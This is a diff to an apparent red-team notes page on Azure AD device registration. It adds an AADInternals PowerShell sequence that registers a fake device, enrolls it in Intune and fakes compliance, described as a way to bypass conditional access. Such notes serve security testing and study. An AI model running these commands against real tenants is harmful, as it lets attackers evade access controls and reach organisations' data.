@@ -59,8 +59,17 @@ Device registration variants ([source](https://twitter.com/lukasberancz/status/1
     - all Windows desktop and server versions
     - PRT obtained via CloudAP
 
+Register device and fake device compliance with [[notes/tools/aadinternals]] ([source](http://web.archive.org/web/20230110065457/https://aadinternals.com/post/mdm/)).
+
+~~~ ps1
+Get-AADIntAccessTokenForAADJoin -SaveToCache
+Join-AADIntDeviceToAzureAD -DeviceName 'SixByFour' -DeviceType 'Commodore' -OSVersion 'C64'
+Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache 
+Join-AADIntDeviceToIntune -DeviceName 'SixByFour'
+Start-AADIntDeviceIntuneCallback -DeviceName 'SixByFour' -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx
+~~~
+
 References:
 
 - [Automating Azure AD authentication, Primary Refresh Token (ab)use and device registration](http://web.archive.org/web/20221109155717/https://dirkjanm.io/introducing-roadtools-token-exchange-roadtx/), introduction of `roadtx`
 - [RoadTX Wiki](https://github.com/dirkjanm/ROADtools/wiki/ROADtools-Token-eXchange-(roadtx))
-- [Bypassing conditional access by faking device compliance](http://web.archive.org/web/20230110065457/https://aadinternals.com/post/mdm/)
